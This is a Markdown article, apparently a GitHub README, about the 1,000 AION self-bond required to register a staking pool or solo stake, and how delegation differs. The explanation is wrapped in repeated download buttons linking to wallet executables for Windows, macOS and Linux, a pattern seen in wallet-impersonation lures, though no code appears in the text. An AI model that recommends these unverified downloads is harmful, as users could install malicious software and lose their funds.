![Aion Wallet](assets/banner-article.png)

# Aion minimum stake: the 1,000 AION bond

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

Registering as a pool or as a solo staker on Aion requires a self-bond of at least 1,000 AION, while delegating to a pool that already exists does not require that bond.

That distinction answers most of the questions the number produces. The 1,000 AION figure belongs to the people who produce blocks in their own name, not to the holder who simply points existing stake at a pool.

## You'll see this if

- A guide says staking needs 1,000 AION and you hold less.
- You are deciding between running a pool and delegating.
- You registered a pool and want to know what the bond is for.
- You are comparing Aion with a network whose minimum is expressed per validator.

## What the bond is for

A self-bond is skin in the game. A pool operator who behaves badly can lose part of it, which makes the commitment meaningful in a way a purely delegated pool would not be.

It also sets the barrier to entry for block production. Running a pool is a small business with infrastructure, monitoring and a commission rate; the bond is the deposit that goes with it.

## Who needs it

A public pool needs it. A private pool needs it. A solo staker needs it. All three are producing blocks and registering with the network, so all three post the bond.

A delegator does not. Delegation is an assignment of weight to an existing pool, and the pool has already posted the bond on the delegator's behalf.

## What delegation does require

An amount worth delegating, a fee for the transaction, and a pool that accepts your stake. Pools can set their own minimum delegation, which is usually lower than the bond and varies between operators.

Leave a small balance available after delegating. Undelegating is its own transaction with its own fee, and a wallet emptied to the last unit cannot pay for the exit.

## The numbers around the bond

The bond is 1,000 AION per registration, and a pool's own stake relative to what it holds in delegation is constrained as well: operators are expected to self-bond at least a small percentage of total delegated stake, which is what keeps a large pool from being run on a trivial deposit.

Commission is the operator's revenue, and it is set by the operator within rules that limit how often it can change. That lockout is measured in 60,480 blocks, roughly seven days, and it is separate from the delegator's thaw.

## Deciding between the two paths

Running a pool makes sense when you have the bond, the infrastructure and a reason for others to delegate to you. It is an operating role, not a passive one.

Delegating makes sense for almost everyone else. It needs no server, no monitoring and no bond, and the [how to stake AION](https://github.com/aion-wallet/aion-staking/blob/main/how-to-stake-aion.md) guide covers the transaction itself.

Solo staking sits between them: you produce blocks in your own name without pooling other people's stake, and you still post the bond. The [Aion solo staker node](https://github.com/aion-wallet/aion-staking/blob/main/aion-solo-staker-node.md) guide describes what that involves.

## When the bond is not enough

A registered pool with the bond posted can still fail to earn. Blocks are produced according to weight, and a pool with a small total stake produces rarely; the bond is an entry requirement, not a guarantee of frequency.

This is why a new pool's early returns are noisy, and why a delegator choosing between a large pool and a new one is choosing between steadier production and a higher share of a smaller total.

Delegation amounts can be as small as the pool accepts, so a holder with a few hundred AION is not excluded from staking; the bond is an operator requirement, not an entry ticket for everyone else.

A delegator who later wants the operator role should read the difference before posting anything. The [how to stake AION](https://github.com/aion-wallet/aion-staking/blob/main/how-to-stake-aion.md) guide covers delegation from the wallet, and the [Aion solo staker node](https://github.com/aion-wallet/aion-staking/blob/main/aion-solo-staker-node.md) article sets out what the bond buys you once you are producing blocks yourself.

## Prevention

Read the requirement before committing funds to a registration. A registration cannot be undone quickly, and the bond is locked in the pool's position rather than sitting free in the wallet.

If you delegate instead, write down the pool and the amount. The bond discussions are about operators; a delegator's job is to keep the transaction and its thaw straight.

Update the wallet before any staking operation, so the screens match the network's current behaviour.

## Frequently asked questions

### Is 1,000 AION the minimum delegation?

No. It is the self-bond for registering a pool or a solo stake. Delegation minimums come from the pool.

### Can several people share a pool registration?

The bond is posted by the operator who registers. Delegators contribute weight, not bond.

### Is the bond returned when a pool closes?

The registration is part of the staking contract, and closing is a transaction rather than a withdrawal on demand. Treat the bond as committed for as long as you operate.

### Does a bigger bond earn more?

Indirectly. Weight, not bond size, drives block production; the bond is the entry requirement and the operator's own stake.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [How to stake AION](https://github.com/aion-wallet/aion-staking/blob/main/how-to-stake-aion.md) - the delegation transaction from start to finish.
- [Aion staking pool choice](https://github.com/aion-wallet/aion-staking/blob/main/aion-staking-pool-choice.md) - what to compare between pools.
- [Aion solo staker node](https://github.com/aion-wallet/aion-staking/blob/main/aion-solo-staker-node.md) - producing blocks in your own name.
- [Aion undelegating time](https://github.com/aion-wallet/aion-staking/blob/main/aion-undelegating-time.md) - the thaw, and the lockout it is confused with.
